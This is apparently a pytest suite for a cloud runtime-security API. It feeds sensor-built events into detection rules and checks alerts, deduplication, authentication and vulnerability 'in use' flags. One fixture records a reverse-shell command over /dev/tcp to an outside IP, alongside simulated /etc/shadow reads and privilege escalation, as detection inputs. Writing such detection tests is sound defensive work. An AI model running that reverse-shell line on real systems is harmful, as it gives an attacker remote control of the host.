"""End-to-end: events built by the real runtime sensor (sensor/runtime_sensor) are
posted to the API, stored, run through the detection engine, and feed the
vulnerability "in use at runtime" flag.
"""
from __future__ import annotations

import sys
from datetime import timedelta
from pathlib import Path

import pytest

from app.models import Asset, Vulnerability, utcnow
from app.services.sensor import apply_library_loaded, expire_stale_in_use, normalize_package, version_matches
from tests.conftest import AUTH

SENSOR_DIR = Path(__file__).resolve().parents[2] / "sensor"
if SENSOR_DIR.is_dir():
    sys.path.insert(0, str(SENSOR_DIR))
schema = pytest.importorskip("runtime_sensor.schema")
detections = pytest.importorskip("runtime_sensor.detections")
shipper = pytest.importorskip("runtime_sensor.shipper")

URL = "/api/runtime/events"


def _pod(client) -> dict:
    return client.get("/api/assets", params={"type": "pod"}).json()[0]


def _sensor_events(pod: dict, vm: dict) -> list[dict]:
    """A small attack story on one pod + one VM, as the sensor would emit it."""
    ns = pod["properties"].get("namespace")
    k8s = schema.K8sInfo(namespace=ns, pod=pod["name"], node="aks-node-1", container="web")
    cid = "ab" * 32
    evs = [
        schema.RuntimeEvent(
            event_type="process_exec", sensor_id="aks-node-1", host="aks-node-1", container_id=cid, k8s=k8s,
            process=schema.ProcessInfo(pid=4242, ppid=4200, name="bash", exe="/bin/bash", parent_name="node",
                                       cmdline="bash -i >& /dev/tcp/198.51.100.7/9001 0>&1", uid=1000, euid=1000)),
        schema.RuntimeEvent(
            event_type="network_connect", sensor_id="aks-node-1", host="aks-node-1", container_id=cid, k8s=k8s,
            process=schema.ProcessInfo(pid=4243, name="curl"),
            network=schema.NetworkInfo(src_ip="10.0.0.12", src_port=51000, dst_ip="185.220.101.47", dst_port=443)),
        schema.RuntimeEvent(
            event_type="privilege_change", sensor_id="aks-node-1", host="aks-node-1", container_id=cid, k8s=k8s,
            process=schema.ProcessInfo(pid=4244, name="pwn", uid=1000, euid=0)),
        schema.RuntimeEvent(
            event_type="file_access", sensor_id=vm["name"], host=vm["name"],
            cloud=schema.CloudInfo(provider="azure", resource_id=vm["id"]),
            file=schema.FileInfo(path="/etc/shadow", operation="open")),
    ]
    for e in evs:
        detections.apply_detections(e)
    return [e.to_dict() for e in evs]


def test_native_sensor_events_produce_alerts(client):
    pod = _pod(client)
    vm = client.get("/api/assets", params={"type": "vm"}).json()[0]
    events = _sensor_events(pod, vm)
    payload = shipper.Shipper(payload_format="list").build_payload(events)

    r = client.post(URL, json=payload, headers=AUTH)
    assert r.status_code == 202, r.text
    body = r.json()
    assert body["accepted"] == 4 and body["alerts_triggered"] >= 4 and body["duplicates"] == 0

    pod_rules = {a["rule_id"] for a in client.get("/api/alerts", params={"asset_id": pod["id"]}).json()}
    assert {"CDR-001", "CDR-003", "CDR-004", "CDR-005"} <= pod_rules, pod_rules
    vm_rules = {a["rule_id"] for a in client.get("/api/alerts", params={"asset_id": vm["id"]}).json()}
    assert "CDR-006" in vm_rules

    # Stored and visible next to simulated events.
    sensor_feed = client.get("/api/runtime/events", params={"source": "sensor"}).json()
    assert len(sensor_feed) == 4
    assert {e["event_type"] for e in sensor_feed} == {"process_exec", "network_connection", "privilege_escalation",
                                                       "file_access"}
    assert all(e["data"]["labels"]["schema_version"] == "1.0" for e in sensor_feed)
    all_sources = {e["source"] for e in client.get("/api/runtime/events", params={"limit": 1000}).json()}
    assert all_sources == {"sensor", "simulated"}

    # Alert detail timeline links the sensor event.
    rev = next(a for a in client.get("/api/alerts", params={"asset_id": pod["id"]}).json() if a["rule_id"] == "CDR-001")
    det = client.get(f"/api/alerts/{rev['id']}").json()
    assert any(t["triggered"] and t["source"] == "sensor" for t in det["timeline"])

    # Re-delivery (sensor retry) is de-duplicated on event_id.
    again = client.post(URL, json=payload, headers=AUTH).json()
    assert again["duplicates"] == 4 and again["alerts_triggered"] == 0
    assert len(client.get("/api/runtime/events", params={"source": "sensor"}).json()) == 4


def test_envelope_and_compat_formats_accepted(client):
    pod = _pod(client)
    vm = client.get("/api/assets", params={"type": "vm"}).json()[0]
    envelope = shipper.Shipper(payload_format="envelope", sensor_id="aks-node-1").build_payload(_sensor_events(pod, vm))
    r = client.post(URL, json=envelope, headers=AUTH)
    assert r.status_code == 202 and r.json()["accepted"] == 4

    compat = shipper.Shipper(payload_format="cnapp-mvp").build_payload(_sensor_events(pod, vm))
    r = client.post(URL, json=compat, headers=AUTH)
    assert r.status_code == 202, r.text
    assert r.json()["alerts_triggered"] >= 1


def test_library_loaded_marks_vulnerability_in_use(client):
    dormant = client.get("/api/vulnerabilities", params={"in_use": "false"}).json()
    v = next(x for x in dormant if x["asset_type"] in {"vm", "pod"})
    asset = client.get("/api/assets/detail", params={"id": v["asset_id"]}).json()["asset"]
    if asset["type"] == "pod":
        where = {"k8s": schema.K8sInfo(namespace=asset["properties"].get("namespace"), pod=asset["name"])}
    else:
        where = {"cloud": schema.CloudInfo(provider="azure", resource_id=asset["id"])}
    lib = schema.RuntimeEvent(event_type="library_loaded", sensor_id="n1", host="n1", **where,
                              library=schema.LibraryInfo(path=f"/usr/lib/{v['package']}.so", package=v["package"],
                                                         version=f"{v['version']}-1ubuntu0.1", source="dpkg"))
    unrelated = schema.RuntimeEvent(event_type="library_loaded", sensor_id="n1", host="n1", **where,
                                    library=schema.LibraryInfo(path="/usr/lib/libfoo.so.1", package="libfoo"))
    r = client.post(URL, json=[lib.to_dict(), unrelated.to_dict()], headers=AUTH)
    assert r.status_code == 202, r.text
    assert r.json()["in_use_updates"] >= 1 and r.json()["alerts_triggered"] == 0

    after = next(x for x in client.get("/api/vulnerabilities", params={"asset_id": v["asset_id"]}).json()
                 if x["id"] == v["id"])
    assert after["in_use"] is True and after["in_use_source"] == "sensor"
    assert after["risk_score"] > v["risk_score"]
    # Only the heartbeat that changed something is kept in the event feed.
    lib_events = client.get("/api/runtime/events", params={"event_type": "library_loaded"}).json()
    assert len(lib_events) == 1


def test_ingest_requires_token(client):
    ev = schema.RuntimeEvent(event_type="file_access", file=schema.FileInfo(path="/etc/shadow", operation="open"))
    assert client.post(URL, json=[ev.to_dict()]).status_code == 401
    assert client.post(URL, json=[ev.to_dict()], headers={"Authorization": "Bearer nope"}).status_code == 401


def test_invalid_native_event_rejected(client):
    bad = schema.RuntimeEvent(event_type="network_connect").to_dict()
    bad["network"] = {"dst_ip": "1.2.3.4", "dst_port": 99999}
    assert client.post(URL, json=[bad], headers=AUTH).status_code == 422
    bad2 = schema.RuntimeEvent(event_type="process_exec").to_dict()
    bad2["event_type"] = "kernel_module_load"
    assert client.post(URL, json=[bad2], headers=AUTH).status_code == 422


def test_stale_sensor_in_use_flag_expires(session):
    session.add(Asset(id="vm-x", name="vm-x", type="vm"))
    v = Vulnerability(asset_id="vm-x", cve_id="CVE-2023-0286", package="openssl", version="3.0.7", cvss=7.4,
                      severity="high")
    session.add(v)
    session.flush()
    assert apply_library_loaded(session, "vm-x", {"package": "libssl3", "version": "3.0.7-1ubuntu1"}) == 1
    assert v.in_use and v.in_use_source == "sensor"
    v.in_use_last_seen = utcnow() - timedelta(hours=4)
    assert expire_stale_in_use(session) == 1
    assert not v.in_use and v.in_use_source is None


@pytest.mark.parametrize("observed,expected", [
    ("libssl3", "openssl"), ("libssl", "openssl"), ("zlib1g", "zlib"), ("liblzma5", "xz-utils"),
    ("libnghttp2-14", "nghttp2"), ("numpy", "numpy"), ("log4j-core", "log4j-core"), ("Requests", "requests"),
])
def test_package_normalization(observed, expected):
    assert normalize_package(observed) == expected


@pytest.mark.parametrize("observed,vulnerable,ok", [
    ("3.0.7", "3.0.7", True), ("3.0.7-1ubuntu0.1", "3.0.7", True), ("1:3.0.7-1", "3.0.7", True),
    ("3.0.70", "3.0.7", False), ("3.0.8", "3.0.7", False), (None, "3.0.7", True),
])
def test_version_matching(observed, vulnerable, ok):
    assert version_matches(observed, vulnerable) is ok
